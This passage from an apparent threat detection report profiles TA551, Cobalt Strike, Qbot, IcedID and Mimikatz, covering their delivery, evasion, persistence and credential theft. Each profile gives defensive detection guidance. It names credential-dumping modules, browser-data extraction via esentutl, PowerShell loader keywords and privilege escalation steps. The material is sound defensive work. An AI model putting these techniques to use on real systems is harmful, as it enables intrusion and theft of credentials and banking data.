wide\n\nmargin. Its pervasiveness was revealed not only in the volume of detections, but\n\nin the number of organizations affected across multiple industries and company\n\nsizes. The preeminence of TA551 is due in part to our depth of detection\n\ncoverage for it: throughout 2020, 55 distinct detection analytics triggered on\n\nactivity that we’ve associated with TA551.\n\nTA551 also took the top spot due to our ability to detect it in the earliest stages\n\nof initial access through patterns in malicious attachments. Approximately\n\ntwo-thirds of TA551 detections we observed didn’t progress beyond opening the\n\nmalicious attachment. To understand how an organization can be part of the\n\ntwo-thirds that didn’t get infected with the next stage of malware, let’s take a\n\nlook at the progression of a TA551 attack.\n\n\n###### OVERALL RANK\n\n#### 15.5%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\n###### Initial access\n\nTA551 gains initial access via macro-laden Microsoft Word documents delivered\n\nwithin a password-protected ZIP archive attached to a phishing email. Wrapping\n\nmalicious attachments within password-protected archives enables these\n\nmessages to bypass many mail protection filters by preventing direct analysis\n\nof the malicious files. This technique has become more common in recent\n\nyears, as it increases the likelihood that the phishing message will make it to a\n\nuser’s inbox. While TA551 varies the filenames for these ZIP archives, including\n\ntargeted names tailored to the recipient’s organization, in many cases the name\n\nwas either request.zip or info.zip.\n\n###### The drop\n\nAfter opening the archive using a password provided within the email body, the\n\nrecipient is presented with a Word document containing malicious macros. This\n\nis the dropper, designed to download additional malware from an adversary\ncontrolled site. This is a crucial point for organizations with a defense-in-depth\n\nstrategy; many of our TA551 detections progressed no further than the opening\n\nof this malicious document. Why? Because organizations that have implemented\n\n[a restrictive macro policy disrupt this attack by preventing the execution of](https://www.cisecurity.org/white-papers/intel-insight-how-to-disable-macros/)\n\nmalicious code. Such a policy is the primary distinction between the two-thirds\n\nof detections that stopped here and the one-third that progressed to the more\n\nimpactful stages of the attack.\n\n###### The macro factor\n\nFor a variety of reasons, many organizations and users do allow macros to\n\nrun. In these cases, the macro will result in a network connection to attempt\n\nto download the next stage of the malware. Herein lies another example of\n\na defense-in-depth strategy that may disrupt the attack: a web proxy that\n\ninspects network traffic may block access to the domain hosting the malicious\n\npayload. In some cases, we observed a network connection and creation of an\n\nempty file as a result of the attempted download, but because the malicious\n\ncontent was prevented from being downloaded, the attack chain ended there.\n\n###### DLL installation\n\nIf a macro policy doesn’t prevent the code from running and a web proxy doesn’t\n\nprevent the next payload from being downloaded, a new malware family will\n\nlikely execute. TA551 typically transitions from the initial access phase to\n\nmalware execution via a DLL installer. There have been several variations in how\n\nthe DLL installer payload was downloaded (see T1105: Ingress Tool Transfer). In\n\n\n-----\n\nsome cases, Microsoft Word downloaded the file directly. Other cases leveraged\n\nrenamed system utilities certutil.zip or mshta.zip to further distance the\n\npayload from the dropper. The downloaded DLL file typically masqueraded as\n\nwell, using a variety of different non-DLL extensions to attempt to blend in—\n\nwe’ve seen .dat, .jpg, .pdf, .txt, and even .theme file extensions.\n\nDespite these attempts to masquerade (and sometimes because of them), our\n\ndetection analytics repeatedly triggered when the payload was executed. For\n\nmost of 2020, this execution was done via regsvr32.exe; however, near the end\n\nof the year this was replaced with the use of rundll32.exe. While far from the\n\nonly threat to use these T1218: Signed Binary Proxy Execution sub-techniques,\n\nit is no coincidence that T1218 was the second-most prevalent technique we\n\nobserved in 2020.\n\n###### Payload\n\nOnce the DLL installer runs, the next stage of malware begins. TA551 has\n\ndelivered various payloads over the years:\n\n- In 2019 and early 2020, Ursnif and Zloader were common payloads.\n\n- In mid-2020, TA551 favored delivering Valak as a first-stage and IcedId as a\n\nsecond-stage payload for a few months\n\n- By mid-July 2020, TA551 stopped using Valak and exclusively delivered\n\nIcedID (our fourth most prevalent threat) as its first-stage payload through\n\nthe end of the year\n\n- In January 2021, after a brief holiday hiatus, TA551 campaigns returned with\n\na new notable payload: Qbot (our third most prevalent threat)\n\nOur understanding of this threat is still evolving, as is the relationship between\n\nTA551’s initial access and the post-exploitation goals of the later-stage malware.\n\n[For another perspective on TA551, check out this post from Unit 42 and follow](https://unit42.paloaltonetworks.com/ta551-shathak-icedid/)\n\n**[Brad Duncan on Twitter, who has helped us better understand this threat.](https://twitter.com/malware_traffic)**\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nWinword spawning **regsvr32.exe**\n\n**ATT&CK technique(s):** T1218.010 Signed Binary Proxy Execution: Regsvr32\n\n**ATT&CK tactic(s):** Defense Evasion, Initial Access\n\n\n-----\n\n**Details:** TA551 transitions from initial access to execution via a defense evasion\n\ntactic leveraging the Microsoft-signed binary **regsvr32.exe. While the use of a**\n\nsigned binary may try to blend in with typical running processes, the unusual\n\nparent-child relationship between **winword.exe** and **regsvr32.exe** provides a\n\ndetection opportunity from an endpoint perspective. It is extremely unusual to\n\nsee Word executing **regsvr32.exe; this is almost always indicative of a malicious**\n\nmacro. In the example below, **84925290.dat** is actually a DLL file masquerading\n\nas a data (DAT) file. More on that in Detection opportunity 3 below.\n\n###### Detection opportunity 2\n\nRenamed Windows system binary **mshta.exe** spawned from WMI and making\n\nexternal network connections\n\n**ATT&CK technique(s):** T1218.005 Signed Binary Proxy Execution: Mshta,\n\nT1036.003 Masquerading: Rename System Utilities\n\n**ATT&CK tactic(s):** Defense Evasion, Execution\n\n**Details:** TA551 changed its macro execution during 2020, evading the first\n\ndetection opportunity by leveraging Windows Management Instrumentation\n\n(WMI) to break the parent-child process lineage from **winword.exe. Instead**\n\nof downloading the installer DLL directly via the macro, TA551 leveraged a\n\nMicrosoft HTML Application (HTA) file to retrieve the malicious payload. Not only\n\nthat, the adversaries took the extra step to rename **mshta.exe** in an attempt to\n\nmasquerade this activity.\n\nDespite these efforts at evasion, this activity actually represents three detection\n\nopportunities in one! Evaluating process hashes and/or internal binary\n\nmetadata is a must when masquerading is in play. When a legitimate file has\n\nbeen renamed, identifying a mismatch between the expected filename and\n\nthe observed filename often leads to high-fidelity detection. In this case, once\n\nwe’ve unmasked **mshta.exe, two more detection opportunities arise from an**\n\nunderstanding of typical behavior for this binary. The relationship of **wmiprvse.**\n\n**exe** as the parent process to mshta.exe is also highly unusual, and a high-fidelity\n\ndetection opportunity. Similarly, an external network connection from **mshta.**\n\n**exe** is unusual behavior that may draw attention to this process execution.\n\n\n-----\n\nFor those of you detecting at home, note that none of this would have been\n\npossible if our detection coverage relied solely on the filename of **mshta.exe** to\n\nbe accurate.\n\n###### Detection opportunity 3\n\nRegsvr32 attempting to register a file without a **.dll** extension\n\n**ATT&CK technique(s):** T1218.010 Signed Binary Proxy Execution: Regsvr32,\n\nT1036.003 Masquerading\n\n**ATT&CK tactic(s):** Defense Evasion\n\n**Details:** While the first two detection opportunities focused on how TA551\n\ndelivered the malicious installer DLL, our third detection opportunity focuses on\n\nhow that payload is executed. Continuing with the masquerading theme, TA551\n\nprefers to disguise its malicious code as a more benign file type such as a JPG\n\nor PDF. While this might foil a defender looking for executable file extensions to\n\nanalyze, this masquerading trick again results in a detection opportunity with\n\nendpoint monitoring due to abnormal process behavior. It is highly unusual\n\nfor **regsvr32, a tool designed to register and unregister object linking and**\n\nembedding controls on Windows systems, to register files with these extensions.\n\nWhile there are some legitimate exceptions you may need to tune out in your\n\nenvironment, **regsvr32** typically acts upon files with a **.dll** extension.\n\n\n###### Jeff Felling\n\n**P R I N C I PA L**\n**I N T E L L I G E N C E A N A LY S T**\n\nJeff Felling is a puzzle solver\n\nwho currently contemplates the\n\nconundrums confounding corporate\n\ncomputer custodians, aka a threat\n\nhunter. After nearly a dozen years\n\nanalyzing anomalies, foraging for\n\nforensic artifacts, and mulling over\n\nmalware for the DoD, Jeff returned\n\nhome to Indiana in 2016 where he\n\nhelped create Anthem, Inc.’s threat\n\nhunting program, ORION, prior to\n\njoining Red Canary in April 2019. Jeff\n\nholds degrees in mathematics from\n\nJohns Hopkins University (MS) and\n\nPurdue University (BS), and is certified\n\nin security, incident handling, and\n\nforensic analysis through SANS.\n\n\n-----\n\n###### T H R E AT\n\n##### Cobalt Strike\n\nCobalt Strike is a post-exploitation tool used by many adversaries and\nassociated with many threats. It’s a force multiplier that adds value for\nadversaries during nearly any incident.\n\n##### Analysis\n\nCobalt Strike is an adversary simulation platform used by both red teams and\n\nadversaries. The tool integrates with functionality from multiple offensive\n\n[security projects and can extend its functionality with aggressor scripts. In](https://www.cobaltstrike.com/aggressor-script/index.html)\n\n2020 we observed adversaries using Cobalt Strike during targeted attacks to\n\nsteal payment card data, ransomware incidents to retain a foothold, red team\n\nengagements, and even incidents involving malicious document droppers.\n\nAdversaries can buy Cobalt Strike, and there are older, cracked versions of\n\nCobalt Strike freely available to adversaries online.\n\nCobalt Strike fills adversaries’ needs by providing a reliable post-exploitation\n\nagent that works well and allows the adversaries to focus on other parts of the\n\nattack lifecycle. It fills this need so well that multiple cybercrime enterprises\n\nand advanced threats have used the tool as part of compromises involving\n\n[ransomware, data theft, and more. In incidents involving Bazar malware,](https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/)\n\nwe observed adversaries deploying Cobalt Strike payloads prior to Ryuk\n\nransomware. In these cases, the adversaries often moved quickly, taking as little\n\n[as two hours to reach their objective. In other cases—such as 2020’s Solorigate](https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/)\n\n**[supply chain compromise—adversaries created custom shellcode loaders to](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)**\n\ndeploy Cobalt Strike payloads. Cobalt Strike is so common and reliable that\n\nadversaries create their own custom tooling to simply deploy the payloads,\n\nknowing that they will likely succeed if they can just get the payload past\n\nsecurity controls. This capability demonstrates how Cobalt Strike fits into the\n\nthreat model for nearly any organization.\n\nCobalt Strike can generate and execute payloads in the form of an EXE, DLL, or\n\n[shellcode; these payloads are what Cobalt Strike refers to as a Beacon. Beacons](https://www.cobaltstrike.com/help-beacon)\n\nallow adversaries to leverage multiple code delivery and execution methods\n\nduring attacks. Cobalt Strike beacons evade defenses using Process Injection\n\nto execute malicious code within the memory space of native Windows binaries\n\nsuch as the Windows DLL Host rundll32.exe. During lateral movement, Cobalt\n\nStrike beacons may execute as Windows services spawning PowerShell code or\n\n\n###### OVERALL RANK\n\n#### 11.6%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\n[binaries that mirror the functions of PsExec. In addition, adversaries may pivot](https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/)\n\nbetween endpoints using WMI commands or SMB named pipe communication.\n\n[For privilege escalation, Cobalt Strike can use named pipe impersonation to](https://redcanary.com/blog/getsystem-offsec/)\n\nexecute code as NT AUTHORITY \\SYSTEM for unfettered access to an endpoint.\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nBeacons executing via PowerShell\n\n**ATT&CK technique(s):** T1059.001 Command and Scripting Interpreter:\n\nPowerShell, T1027 Obfuscated Files or Information\n\n**ATT&CK tactic(s):** Execution, Defense Evasion\n\n**Details:** Cobalt Strike Beacons can execute in PowerShell form, with\n\n**powershell.exe** loading obfuscated code into memory for execution.\n\nThese beacons may execute as Windows services or from other persistence\n\nmechanisms determined by the adversary. To detect these beacons, you\n\ncan search for **powershell.exe** processes with command lines containing\n\nplaintext and Base64-encoded variations of the following common\n\nkeyword combinations:\n\n**•** **IO.MemoryStream**\n\n**•** **FromBase64String**\n\n**•** **New-Object**\n\nFor example, the highlighted portion of the encoded PowerShell in the\n\nscreenshot below decodes to\n\n**$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String.**\n\n\n-----\n\n###### Detection opportunity 2\n\nPrivilege escalation through named pipe impersonation\n\n**ATT&CK technique(s): T1543.003 Create or Modify System Process: Windows**\n\nService\n\n**ATT&CK tactic(s): Privilege Escalation**\n\n**[Details: Cobalt Strike Beacons can execute commands to escalate privileges](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/)**\n\nto the NT AUTHORITY\\SYSTEM account from certain security contexts. To\n\nachieve this, the beacon can schedule the execution of a Windows Service that\n\n[manipulates data using a named pipe. You can detect this activity by identifying](https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/)\n\ninstances of Command Processor cmd.exe where the command line contains\n\nthe keywords echo and pipe. Note that Metasploit will demonstrate similar\n\nartifacts when performing named-pipe impersonation. Additional context and\n\n[detection guidance can be found in this blog.](https://redcanary.com/blog/getsystem-offsec/)\n\n###### Detection opportunity 3\n\nDefense Evasion by Process Injection\n\n**ATT&CK technique(s): T1055.012 Process Injection: Process Hollowing**\n\n**ATT&CK tactic(s): Defense Evasion**\n\n**Details: Cobalt Strike Beacons can inject code into memory. To perform this**\n\nfunction, a Beacon will spawn a native Windows binary and then manipulate its\n\nmemory space. In many cases, the spawned processes do not have command\nline arguments specified when they should under normal operation. To\n\ndetect this activity, identify instances of these processes initiating network\n\nconnections without any command-line arguments specified:\n\n**•** **rundll32.exe**\n\n**•** **werfault.exe**\n\n**•** **searchprotocolhost.exe**\n\n**•** **gpupdate.exe**\n\n**•** **regsvr32.exe**\n\n\n-----\n\n**•** **svchost.exe**\n\n**•** **msiexec.exe**\n\n\n###### Tony Lambert\n\n**I N T E L L I G E N C E**\n**A N A LY S T**\n\nTony is a professional geek who loves\n\nto jump into all things related to\n\ndetection and digital forensics. After\n\nworking in enterprise IT administration\n\nand detection engineering for several\n\nyears, he now applies his DFIR\n\nskills to research malware, detect\n\nmalicious activity, and recommend\n\nremediation paths. Tony is a natural\n\nteacher and regularly shares his\n\nfindings and expertise through blogs,\n\nresearch reports, and presentations at\n\nconferences and events.\n\n\n-----\n\n###### T H R E AT\n\n##### Qbot\n\nQbot is a banking trojan with the ability to quickly spread to other hosts within\nan environment. In 2020 Qbot was observed as a delivery agent for ransomware,\nmost notably ProLock and Egregor.\n\n##### Analysis\n\nQbot, also known as “Qakbot” or “Pinkslipbot,” is a banking trojan that has\n\nbeen active since at least 2007, focusing on stealing user data and banking\n\ncredentials. Over time, the malware has evolved to include new delivery\n\nmechanisms, command and control (C2) techniques, and anti-analysis features.\n\nQbot infections typically stem from phishing campaigns. While some campaigns\n\ndeliver Qbot directly, throughout 2020 we observed Qbot delivered as a\n\nsecondary payload to other prominent malware such as Emotet.\n\nIn addition to data and credential theft, Qbot has the ability to move laterally\n\nwithin an environment. Left unchecked, widespread Qbot infections throughout\n\nan enterprise eventually lead to ransomware. Different ransomware families\n\nhave been observed alongside Qbot, with ProLock being a common occurrence\n\nin early 2020, followed by a much more prolific outbreak of Egregor ransomware\n\nas a Qbot follow-on later in the year. For these reasons, it is imperative to\n\nrespond quickly when Qbot gains a foothold in your environment.\n\n###### Evolving TTPs\n\nQbot presents several opportunities for detection, and while it is actively\n\ndeveloped and TTPs have changed over the years, some things remain the\n\nsame. One of these consistent patterns is the staging folder for the malware.\n\nHistorically, Qbot installed itself as a randomly named EXE into a randomly\n\nnamed subdirectory of AppData\\Microsoft. However, during the latter half of\n\n2020, Qbot switched to using a DLL instead of an EXE. The use of a DLL provides\n\nmore flexibility for defense evasion through Signed Binary Proxy Execution using\n\nRegsvr32 or Rundll32.\n\nAlong with the change to using a DLL, Qbot also changed where it stores\n\nconfiguration information on the infected host. Earlier versions of Qbot stored\n\nthis data within a DAT file in the same randomly named folder as the malicious\n\nbinary. As of late 2020, this data is now stored in the registry, under a randomly\n\n\n###### OVERALL RANK\n\n#### 8.7%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\nnamed subkey under HKCU\\Software\\Microsoft. While this move to the registry\n\nkeeps things a bit more hidden from prying eyes, in both cases the presence\n\nof a randomly named value under the Microsoft folder/key should be cause to\n\ninvestigate. Baselining the normal values in these locations and alerting on\n\nanomalies can be a fruitful way to identify Qbot, as well as other Microsoft\nmasquerading malware attempting to hide out in these places.\n\nOver a decade of development and in-the-wild observation, many researchers\n\n[have studied and reported on Qbot’s evolving TTPs, including Binary Defense](https://www.binarydefense.com/qakbot-upgrades-to-stealthier-persistence-method/)\n\n[and Fortinet.](https://www.fortinet.com/blog/threat-research/deep-analysis-of-a-qbot-campaign-part-1)\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nMicrosoft Office spawning Rundll32 or Regsvr32\n\n**ATT&CK technique(s): T1218.011 Signed Binary Proxy Execution: Rundll32,**\n\nT1218.010 Signed Binary Proxy Execution: Regsvr32\n\n**ATT&CK tactic(s): Defense Evasion**\n\n**Details: Since October 2020, we have observed Qbot delivered as a DLL and**\n\nsubsequently executed using the signed binaries Rundll32 or Regsvr32, which\n\nadversaries commonly use to evade defensive controls. Looking for instances\n\nof either of these processes executed as a child of winword.exe or excel.exe is a\n\nquick win to detect Qbot’s initial access as well as other threats spawning from\n\ninitial access via Microsoft Office. Additionally, we’ve found success with the\n\n**rundll32.exe command-line flag DLLRegisterServer. While this is a legitimate**\n\nfunction for rundll32.exe, with some baselining you can tune this to identify\n\nanomalous behavior.\n\n\n-----\n\n###### Detection opportunity 2\n\nExecution of esentutl to extract browser data\n\n**ATT&CK technique(s):** T1005 Data from Local System\n\n**ATT&CK tactic(s): Collection**\n\n**Details: One way Qbot steals sensitive information is by extracting browser data**\n\nfrom Internet Explorer and Microsoft Edge by using the built-in utility esentutl.\n\n**exe. As we examined normal esenutil command lines, we determined it’s fairly**\n\nrare to see references to Windows\\WebCache in the command line for this\n\ntool. Writing an analytic looking for a process of esenutil.exe with Windows\\\n\n**WebCache in the command line may help you catch this behavior.**\n\n###### Detection opportunity 3\n\nScheduled task names and execution\n\n**ATT&CK technique(s): T1053.005 Scheduled Task/Job: Scheduled**\n\nTask,T1218.010 Signed Binary Proxy Execution: Regsvr32\n\n**ATT&CK tactic(s): Persistence, Defense Evasion**\n\n**Details: The more things change, the more they stay the same. One of the**\n\nmost consistent ways we have detected Qbot over the years is through its use\n\nof scheduled tasks for persistence. While Qbot has consistently relied on this\n\nmethod of persisting, its implementation has varied over time. These variations\n\nhave triggered several different detection analytics.\n\nOne area to focus on is the name of the scheduled task. We often observe this\n\nin the /tn (task name) parameter on the command line of schtasks.exe. Much\n\nlike the subfolders containing the malware, some versions of Qbot have used\n\na random string for the scheduled task name. This is a bit more challenging to\n\n[detect, but using trigram](https://redcanary.com/blog/expediting-false-positive-identification-with-string-comparison-algorithms/) **[analysis, we have been able to identify likely random](https://redcanary.com/blog/process-masquerading/)**\n\ntask names that unearth a variety of pernicious persistence. In addition to the\n\nscheduled task name, the process it executes can also be useful for detection.\n\nIn the below example (showing the more recent DLL variation of Qbot), you\n\ncan see that the process executed by the task is regsvr32.exe. It is unusual to\n\nsee a scheduled task executing regsvr32.exe at all, let alone for a binary in a\n\n\n-----\n\nuser’s profile folder, so looking for that execution presents another detection\n\nopportunity.\n\nIn other cases, instead of a random string of characters, Qbot uses a GUID for\n\nthe scheduled task name. Since GUIDs use a similar pattern, you can create a\n\ndetection analytic looking for schtasks.exe along with create and a regular\n\nexpression for the GUID pattern. You may still encounter some legitimate\n\nsoftware doing this, but it should be fairly straightforward to tune out the noise\n\nbased on the parent process of schtasks or by the specific GUID itself.\n\nIn addition to the scheduled task name, you can also look for what is being\n\nexecuted, similar to the above example. In the below example, the GUID task\n\nname executes JavaScript stored in a file with a .npl file extension. You could\n\ncreate a detection analytic looking for scheduled task execution of a .npl file, or\n\neven take it a step further to look for cscript.exe or wscript.exe execution from\n\nscheduled tasks (though that may take some tuning).\n\n\n###### Kyle Rainey\n\n**I N T E L L I G E N C E**\n**A N A LY S T**\n\nKyle has been providing proactive\n\nand reactive incident response and\n\nforensics services to Fortune 500\n\ncompanies for over five years. As an\n\nintelligence analyst at Red Canary,\n\nhe leverages his years of experience\n\nconducting investigations and building\n\ndetections in order to engineer\n\nimpactful, scalable intelligence\n\nproducts. Kyle is passionate about\n\nsolving hard problems and constantly\n\nlearning.\n\n\n-----\n\n###### T H R E AT\n\n##### IcedID\n\nIcedID, also known as Bokbot, is a banking trojan often delivered through\nphishing campaigns and other malware. In 2020, it was most commonly found as\nthe result of TA551 initial access.\n\n##### Analysis\n\nIcedID is a crimeware-as-a-service banking trojan that steals sensitive financial\n\ninformation by creating a local proxy to intercept all browsing traffic on an\n\ninfected host. First appearing in the wild in late 2017, IcedID is believed to be\n\nthe successor to the formerly prolific Vawtrak (aka Neverquest) trojan, which\n\n[declined following the arrest of key developers in January 2017. IcedID has](https://blog.fox-it.com/2018/08/09/bokbot-the-rebirth-of-a-banker/)\n\nhistorically been delivered as a later-stage payload from a variety of notable\n\nthreats, including Emotet, TrickBot, and Hancitor. In 2020, the primary initial\n\naccess vector Red Canary observed delivering IcedID was TA551. Early in the\n\nyear, we often saw IcedID as a tertiary payload after TA551 initially deployed\n\nUrsnif or Valak. However, by July the intermediary payloads ceased as TA551\n\nopted to deliver IcedID directly. Since TA551 ranked as our most prevalent threat\n\nfor 2020, it is no surprise that IcedID—its primary payload—also placed near the\n\ntop of the list.\n\n###### Installation and execution\n\nAfter the installer DLL is executed, IcedID pulls down a configuration file from\n\nits command and control (C2) server. It then spawns an instance of a legitimate\n\nprocess and hooks multiple Windows APIs in order to hollow that process and\n\ninject into it. Throughout most of 2020, msiexec.exe was the target of this\n\nprocess injection, although IcedID has used other processes, such as\n\n**svchost.exe, in the past.**\n\nOnce execution has been achieved via the hollowed process, IcedID proceeds\n\nto establish persistence and act on objectives. IcedID achieves persistence in\n\nmultiple ways, notably via downloading an additional binary (in EXE or DLL\n\nform) to the user’s local folder. We’ve observed a few different folders where\n\nthe binary has been written, typically either in a subfolder of AppData\\Roaming\n\nor AppData\\Local. In some cases this subfolder has been named after the\n\nusername of the infected user, and in others it appears to be a random string of\n\ncharacters. IcedID then sets that binary to run via scheduled tasks. Upon restart,\n\n\n###### OVERALL RANK\n\n#### 7.8%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\nthis persistence mechanism will execute the process hollowing routine again to\n\nreturn control to the main backdoor.\n\n###### Main payload\n\nThe primary purpose of the main backdoor is to steal sensitive data—in\n\nparticular, browsing data including banking information. This is accomplished\n\nby hooking the browser and establishing a local proxy complete with self-signed\n\ncertificates to reroute all web traffic through the adversary-controlled process.\n\nThis enables the adversary to not only monitor traffic of interest, but also to use\n\nweb injects to harvest information when a user attempts to visit a site such as\n\nonline banking. In addition to data theft, IcedID contains a VNC capability for\n\n[remote access to the victim machine. Juniper Threat Labs and IBM X-Force](https://blogs.juniper.net/en-us/threat-research/covid-19-and-fmla-campaigns-used-to-install-new-icedid-banking-malware)\n\nhave also covered IcedID’s capabilities and injection techniques.\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nProcess hollowing msiexec.exe with randomly named .msi file\n\n**ATT&CK technique(s): T1055.012 Process Injection: Process Hollowing,**\n\nT1185 Man in the Browser\n\n**ATT&CK tactic(s): Defense Evasion, Execution**\n\n**Details: IcedID uses a process-hollowed instance of msiexec.exe as a proxy to**\n\nintercept all browsing traffic. Despite the attempts to blend in, it is unusual to\n\nsee a “product” named with six random letters in the msiexec.exe\n\ncommand line.\n\nCoupled with that unusual MSI package name, the man-in-the-middle (MitM)\n\nproxy creates unusual network connections for msiexec.exe as it intercepts all\n\ntraffic from the user’s browser.\n\n\n-----\n\n###### Detection opportunity 2\n\nScheduled task persistence from user’s roaming folder with no command line\n\n**ATT&CK technique(s):** T1053.005 Scheduled Task/Job: Scheduled Task\n\n**ATT&CK tactic(s): Persistence**\n\n**Details: One way IcedID persists is via the Windows Task Scheduler. A good**\n\ndetection opportunity for a variety of threats is to look for scheduled tasks\n\nexecuting from the %Users% folder. In particular, we have found that such tasks\n\nexecuting without any command-line options tend to be more suspicious. The\n\nrandom nature of both the file being executed and the folder containing that file\n\nare common traits of not only IcedID, but a variety of malicious and\n\nunwanted software.\n\n###### Detection opportunity 3\n\nSuspicious child processes from msiexec.exe\n\n**ATT&CK technique(s): T1482 Domain Trust Discovery, T1082 System**\n\nInformation Discovery\n\n**ATT&CK tactic(s): Discovery**\n\n**Details: Detecting techniques in the Discovery tactic is one of the most daunting**\n\ntasks for a security team. Typically the commands used for discovery are the\n\nsame commands system administrators run as part of normal IT operations. One\n\nway to distinguish legitimate discovery commands from suspicious ones is to\n\nlook for unexpected parent/child process relationships. In the case of IcedID, the\n\nactivity stems from the process-hollowed instance of msiexec.exe. The IcedID\n\n\n-----\n\nsysinfo command executes several specific commands that are highly unusual\n\nto see coming from msiexec.exe. Each of the commands below are unusual to\n\nsee as child processes of msiexec.exe in some way or another. In some cases,\n\nthe simple process execution stands out—systeminfo.exe and nltest.exe fall\n\ninto this category of processes we almost never see executed by a legitimate\n\ninstance of msiexec.exe.\n\nIn other cases, the abnormality is a bit more nuanced, and we have to consider\n\nthe command-line behavior of the child process. For instance, it is uncommon to\n\nsee msiexec.exe execute wmic.exe to query the installed antivirus (AV) software,\n\nas seen in the below screenshot. This is a parent-child process relationship that,\n\nwhen combined with the command line, provides a detection opportunity.\n\n\n###### Jeff Felling\n\n**P R I N C I PA L**\n**I N T E L L I G E N C E A N A LY S T**\n\nJeff Felling is a puzzle solver\n\nwho currently contemplates the\n\nconundrums confounding corporate\n\ncomputer custodians, aka a threat\n\nhunter. After nearly a dozen years\n\nanalyzing anomalies, foraging for\n\nforensic artifacts, and mulling over\n\nmalware for the DoD, Jeff returned\n\nhome to Indiana in 2016 where he\n\nhelped create Anthem, Inc.’s threat\n\nhunting program, ORION, prior to\n\njoining Red Canary in April 2019. Jeff\n\nholds degrees in mathematics from\n\nJohns Hopkins University (MS) and\n\nPurdue University (BS), and is certified\n\nin security, incident handling, and\n\nforensic analysis through SANS.\n\n\n-----\n\n###### T H R E AT\n\n##### Mimikatz\n\nMimikatz is a credential-dumping utility commonly leveraged by adversaries,\npenetration testers, and red teams to extract passwords. As an open source\nproject, Mimikatz continues to be actively developed, with several new features\nadded in 2020.\n\n##### Analysis\n\n**[Mimikatz is an open source credential-dumping utility that was initially](https://github.com/gentilkiwi/mimikatz/wiki)**\n\ndeveloped in 2007 by Benjamin Delpy to abuse various Windows authentication\n\ncomponents. While the initial v0.1 release was oriented towards abusing already\n\nwell established “Pass The Hash” attacks, after expanding its library of abuse\n\nprimitives, the tool was publicly released as Mimikatz v1.0 in 2011. A decade\n\nlater, Mimikatz is still a fantastic utility for adversaries to gain lateral mobility\n\nwithin an organization. In 2020, Red Canary observed various actors using\n\n[Mimikatz during intrusions, including deployment alongside cryptominers](https://attack.mitre.org/techniques/T1496/)\n\n[such as Blue Mockingbird or ransomware such as Nefilim, Sodinokibi, and](https://redcanary.com/blog/blue-mockingbird-cryptominer/)\n\n**[Netwalker.](https://www.microsoft.com/security/blog/2020/04/28/ransomware-groups-continue-to-target-healthcare-critical-services-heres-how-to-reduce-risk/)**\n\n###### Evasion Tactics\n\nInterestingly, in the case of Blue Mockingbird, Red Canary observed signs of the\n\nadversary using evasion tactics that may throw off Mimikatz detection. In one\n\nincident, we observed the Mimikatz binary being written to disk as mx.exe in the\n\n**C:\\PerfLogs\\ directory. Renaming the Mimikatz binary may thwart rudimentary**\n\nsignatures looking for the filename mimikatz.exe.\n\nThe directory Mimikatz was written into, C:\\PerfLogs\\, is also of interest—this\n\n[directory has been seen in use by other adversaries such as Ryuk. C:\\PerfLogs\\](https://thedfirreport.com/2020/10/08/ryuks-return/)\n\nis a directory utilized legitimately by Windows Performance Monitor, which\n\nby default requires administrative rights to write to. Generally speaking, an\n\nadversary is already assumed to have elevated privileges if they are using\n\nMimikatz to its fullest extent. While we don’t presume to have a clear answer\n\non why adversaries choose that directory for staging, its use presents an\n\nopportunity for detection by monitoring for the execution of suspicious\n\nbinaries from unusual directories. Many defenders are familiar with monitoring\n\nfor unusual activity coming from C:\\Windows\\Temp, and based on what we\n\nobserved from Blue Mockingbird, C:\\PerfLogs\\ may be another interesting\n\ndirectory to watch out for.\n\n\n###### OVERALL RANK\n\n#### 6.2%\n\n###### CUSTOMERS AFFECTED\n\n\n-----\n\nWhile we observed some malicious use of Mimikatz by adversaries, the\n\nmajority of detections were the result of some kind of testing—including\n\n[adversary simulation frameworks (such as Atomic Red Team) or red teams](https://redcanary.com/atomic-red-team/)\n\nrunning tests, as confirmed by customer feedback. Though Mimikatz offers\n\nmultiple modules, there was not much variety in the modules tested. The\n\n**sekurlsa::logonpasswords module was the most utilized in 2020, providing**\n\nextraction of usernames and passwords for user accounts that have recently\n\nbeen active on the endpoint. In comparison, we did not observe the latest\n\nmodule released in Q3 2020 lsadump::zerologon—which tests\n\nZeroLogon vulnerability CVE-2020-1472—in any of our 2020 detections.\n\nThis finding suggests that testers should consider expanding the Mimikatz\n\nfunctionality they test for. Using Mimikatz to test detection coverage for a range\n\nof behaviors can help ensure you’re also covered for other threats that use those\n\nsame techniques.\n\n##### Detection opportunities\n\n###### Detection opportunity 1\n\nMimikatz module command-line parameters\n\n**ATT&CK technique(s): T1003 OS Credential Dumping**\n\n**ATT&CK tactic(s): Credential Access**\n\n**Details: To identify execution of Mimikatz, look for processes in which module**\n\nnames are observed as command-line parameters. While Mimikatz offers several\n\nmodules related to credential dumping, the sekurlsa::logonpasswords module\n\nis a boon for detection. To expand detection opportunities, you can detect\n\n[additional module names from the Mimikatz repository. While it may not be](https://github.com/gentilkiwi/mimikatz/wiki#modules)\n\ncomprehensive, this is a great starting point for building a list of command-line\n\nparameters to detect on. Additional modules can be found by keeping an eye\n\n[on the commit history of the project or by following the maintainer on Twitter](https://github.com/gentilkiwi/mimikatz/wiki#modules)\n\nso you can be notified when new modules appear. As always with anything\n\nopen source, this project can be forked and modified to evade this detection\n\nopportunity, so it is important to institute defense-in-depth practices within\n\nyour organization and not rely on just one detection opportunity.\n\n\n-----\n\n###### Detection opportunity 2\n\nKerberos ticket file modifications\n\n**ATT&CK technique(s): T1558 Steal or Forge Kerberos Tickets**\n\n**ATT&CK tactic(s): Credential Access**\n\n**Details: Another notable feature is Mimikatz’s ability to steal or forge Kerberos**\n\ntickets. 